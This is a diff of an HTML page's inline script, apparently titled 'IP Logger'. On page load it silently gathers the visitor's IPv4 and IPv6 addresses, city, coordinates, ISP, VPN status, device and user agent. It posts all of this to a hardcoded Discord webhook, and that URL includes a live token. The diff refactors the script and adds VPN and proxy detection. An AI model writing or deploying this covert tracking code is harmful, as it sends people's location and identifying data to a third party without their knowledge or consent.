@@ -18,7 +18,6 @@
     (async () => {
       const WEBHOOK = "https://discord.com/api/webhooks/1556835015906697259/OU0R5LrCPpp0_GCBcXHPpFk1wUc3UlN_kq1rsAjfRK5pjux0l7dXBKMdR9pvFOdswXh2";
 
-      // ── helpers ──────────────────────────────────────────────
       function isIPv4(ip) {
         return /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/.test(ip);
       }
@@ -32,14 +31,12 @@
       function parseUA(ua) {
         let browser = "Unknown", platform = "Unknown", device = "Desktop";
 
-        // Browser
         if (/Edg\//i.test(ua)) browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
         else if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
         else if (/Firefox\//i.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
         else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari " + (ua.match(/Version\/([\d.]+)/) || [])[1];
         else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";
 
-        // Platform / OS
         if (/Windows NT 10/i.test(ua)) platform = "Windows 10/11";
         else if (/Windows NT 6.3/i.test(ua)) platform = "Windows 8.1";
         else if (/Windows NT 6.1/i.test(ua)) platform = "Windows 7";
@@ -49,60 +46,44 @@
         else if (/Linux/i.test(ua)) platform = "Linux";
         else if (/CrOS/i.test(ua)) platform = "Chrome OS";
 
-        // Device type
         if (/Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile/i.test(ua)) device = "Mobile";
         else if (/iPad|Tablet|Nexus 7|Nexus 10|KFAPWI/i.test(ua)) device = "Tablet";
 
         return { browser, platform, device };
       }
 
-      // ── get IPv4 + IPv6 ──────────────────────────────────────
-      let ipv4 = null;
-      let ipv6 = null;
+      // ── Get IPv4 + IPv6 ─────────────────────────────────────
+      let ipv4 = null, ipv6 = null;
 
       try {
         const [v4Res, v6Res] = await Promise.allSettled([
-          // IPv4
-          fetch("https://api.ipify.org?format=json")
-            .then(r => r.json())
-            .then(d => d.ip)
+          fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip)
             .catch(() => fetch("https://ipv4.icanhazip.com/").then(r => r.text()).then(t => t.trim())),
-
-          // IPv6
-          fetch("https://api64.ipify.org?format=json")
-            .then(r => r.json())
-            .then(d => d.ip)
+          fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip)
             .catch(() => fetch("https://ipv6.icanhazip.com/").then(r => r.text()).then(t => t.trim()))
         ]);
 
-        if (v4Res.status === "fulfilled") {
-          const ip = v4Res.value;
-          if (isIPv4(ip)) ipv4 = ip;
-        }
-
-        if (v6Res.status === "fulfilled") {
-          const ip = v6Res.value;
-          // Simple IPv6 check (contains :)
-          if (ip && ip.includes(":") && !isIPv4(ip)) ipv6 = ip;
+        if (v4Res.status === "fulfilled" && isIPv4(v4Res.value)) ipv4 = v4Res.value;
+        if (v6Res.status === "fulfilled" && v6Res.value && v6Res.value.includes(":") && !isIPv4(v6Res.value)) {
+          ipv6 = v6Res.value;
         }
       } catch (_) {}
 
-      // Need at least one IP to continue
       if (!ipv4 && !ipv6) return;
-
-      // Use IPv4 for geo lookup if available, otherwise IPv6
       const lookupIP = ipv4 || ipv6;
 
-
-      // ── rich geo data (multi-source for better accuracy) ─────
+      // ── Multi-source geo + security ─────────────────────────
       let geo = {
         country: "—", country_code: "", region: "—", city: "—",
         postal: "—", lat: "—", lon: "—", timezone: "—",
-        isp: "—", org: "—", asn: "—",
-        proxy: "—", hosting: "—", vpn: "—"
+        isp: "—", org: "—", asn: "—"
       };
 
-      // Score how detailed a result is (higher = better)
+      // Collect security flags from ALL sources (OR logic)
+      let vpnDetected = false;
+      let proxyDetected = false;
+      let hostingDetected = false;
+
       function score(g) {
         let s = 0;
         if (g.city && g.city !== "—" && g.city.length > 2) s += 3;
@@ -116,9 +97,12 @@
 
       try {
         const results = await Promise.allSettled([
-          // 1. ipwho.is (good security + connection data)
+          // 1. ipwho.is (has security object)
           fetch(`https://ipwho.is/${lookupIP}`).then(r => r.json()).then(g => {
             if (g.success === false) return null;
+            if (g.security?.vpn) vpnDetected = true;
+            if (g.security?.proxy) proxyDetected = true;
+            if (g.security?.hosting) hostingDetected = true;
             return {
               country: g.country || "—",
               country_code: g.country_code || "",
@@ -130,14 +114,33 @@
               timezone: (g.timezone && g.timezone.id) || "—",
               isp: g.connection?.isp || "—",
               org: g.connection?.org || "—",
-              asn: g.connection?.asn ? `AS${g.connection.asn} ${g.connection.org || ""}`.trim() : "—",
-              proxy: g.security?.proxy ? "Yes" : "No",
-              hosting: g.security?.hosting ? "Yes" : "No",
-              vpn: g.security?.vpn ? "Yes" : "No"
+              asn: g.connection?.asn ? `AS${g.connection.asn} ${g.connection.org || ""}`.trim() : "—"
             };
           }),
 
-          // 2. ipapi.co
+          // 2. proxycheck.io (strong VPN/proxy detection)
+          fetch(`https://proxycheck.io/v2/${lookupIP}?vpn=1&asn=1`).then(r => r.json()).then(g => {
+            const data = g[lookupIP];
+            if (!data) return null;
+            if (data.proxy === "yes") proxyDetected = true;
+            if (data.type && /VPN|VPN Server/i.test(data.type)) vpnDetected = true;
+            if (data.proxy === "yes" && /Hosting|Data Center|Business/i.test(data.type || "")) hostingDetected = true;
+            return {
+              country: data.country || "—",
+              country_code: data.isocode || "",
+              region: data.region || "—",
+              city: data.city || "—",
+              postal: data.postcode || "—",
+              lat: data.latitude ?? "—",
+              lon: data.longitude ?? "—",
+              timezone: "—",
+              isp: data.provider || data.organisation || "—",
+              org: data.organisation || "—",
+              asn: data.asn ? `${data.asn} ${data.provider || ""}`.trim() : "—"
+            };
+          }),
+
+          // 3. ipapi.co
           fetch(`https://ipapi.co/${lookupIP}/json/`).then(r => r.json()).then(g => {
             if (g.error) return null;
             return {
@@ -151,12 +154,11 @@
               timezone: g.timezone || "—",
               isp: g.org || "—",
               org: g.org || "—",
-              asn: g.asn || "—",
-              proxy: "—", hosting: "—", vpn: "—"
+              asn: g.asn || "—"
             };
           }),
 
-          // 3. freeipapi.com
+          // 4. freeipapi
           fetch(`https://freeipapi.com/api/json/${lookupIP}`).then(r => r.json()).then(g => {
             if (!g.ipAddress) return null;
             return {
@@ -168,32 +170,12 @@
               lat: g.latitude ?? "—",
               lon: g.longitude ?? "—",
               timezone: g.timeZone || "—",
-              isp: "—", org: "—", asn: "—",
-              proxy: "—", hosting: "—", vpn: "—"
-            };
-          }),
-
-          // 4. geojs.io
-          fetch(`https://get.geojs.io/v1/ip/geo/${lookupIP}.json`).then(r => r.json()).then(g => {
-            if (!g.country) return null;
-            return {
-              country: g.country || "—",
-              country_code: g.country_code || "",
-              region: g.region || "—",
-              city: g.city || "—",
-              postal: "—",
-              lat: g.latitude ?? "—",
-              lon: g.longitude ?? "—",
-              timezone: g.timezone || "—",
-              isp: g.organization_name || g.organization || "—",
-              org: g.organization_name || g.organization || "—",
-              asn: g.asn || "—",
-              proxy: "—", hosting: "—", vpn: "—"
+              isp: "—", org: "—", asn: "—"
             };
           })
         ]);
 
-        // Pick the highest-scoring valid result
+        // Pick best location data
         let bestScore = -1;
         for (const r of results) {
           if (r.status === "fulfilled" && r.value) {
@@ -204,14 +186,24 @@
             }
           }
         }
-      } catch (_) {}
 
+        // Extra heuristic: known VPN / datacenter keywords in ISP/Org
+        const text = `${geo.isp} ${geo.org} ${geo.asn}`.toLowerCase();
+        const vpnKeywords = ["vpn", "proxy", "nord", "expressvpn", "mullvad", "surfshark", "cyberghost", "private internet", "proton", "windscribe", "tunnelbear", "ipvanish", "purevpn", "hotspot shield", "vypr", "hide.me"];
+        const hostKeywords = ["hosting", "cloud", "server", "vps", "dedicated", "datacenter", "data center", "amazon", "google", "microsoft", "digitalocean", "linode", "ovh", "hetzner", "leaseweb", "choopa", "vultr"];
+
+        if (vpnKeywords.some(k => text.includes(k))) vpnDetected = true;
+        if (hostKeywords.some(k => text.includes(k))) hostingDetected = true;
+
+      } catch (_) {}
 
       const uaInfo = parseUA(navigator.userAgent || "");
       const flag = getFlag(geo.country_code);
       const now = new Date();
 
-      // ── Discord embed (styled like the screenshot) ───────────
+      const vpnProxyValue = (vpnDetected || proxyDetected) ? "Yes" : "No";
+      const hostingValue = hostingDetected ? "Yes" : "No";
+
       const embed = {
         title: "IP Logger",
         color: 5793266,
@@ -219,7 +211,6 @@
           { name: "IPv4", value: ipv4 ? `\`${ipv4}\`` : "`Not available`", inline: false },
           { name: "IPv6", value: ipv6 ? `\`${ipv6}\`` : "`Not available`", inline: false },
           { name: "Country", value: `${flag} ${geo.country || "—"}`, inline: false },
-
           { name: "Region", value: geo.region || "—", inline: false },
           { name: "City", value: geo.city || "—", inline: false },
           { name: "ZIP", value: String(geo.postal || "—"), inline: false },
@@ -228,8 +219,8 @@
           { name: "ISP", value: geo.isp || "—", inline: false },
           { name: "Organization", value: geo.org || "—", inline: false },
           { name: "ASN", value: geo.asn || "—", inline: false },
-          { name: "VPN/Proxy", value: (geo.vpn === "Yes" || geo.proxy === "Yes") ? "Yes" : (geo.proxy || "No"), inline: false },
-          { name: "Hosting/Cloud", value: geo.hosting || "—", inline: false },
+          { name: "VPN/Proxy", value: vpnProxyValue, inline: false },
+          { name: "Hosting/Cloud", value: hostingValue, inline: false },
           { name: "Device Type", value: uaInfo.device, inline: false },
           { name: "Platform", value: uaInfo.platform, inline: false },
           { name: "Browser", value: uaInfo.browser, inline: false },
@@ -237,9 +228,7 @@
           { name: "Timestamp", value: now.toUTCString(), inline: false },
           { name: "User Agent", value: "```" + (navigator.userAgent || "unknown") + "```", inline: false }
         ],
-        footer: {
-          text: "IP Logger"
-        },
+        footer: { text: "IP Logger" },
         timestamp: now.toISOString()
       };
 
@@ -247,14 +236,9 @@
         await fetch(WEBHOOK, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: null,
-            embeds: [embed]
-          })
+          body: JSON.stringify({ content: null, embeds: [embed] })
         });
-      } catch (_) {
-        // stay silent
-      }
+      } catch (_) {}
     })();
   </script>
 </body>
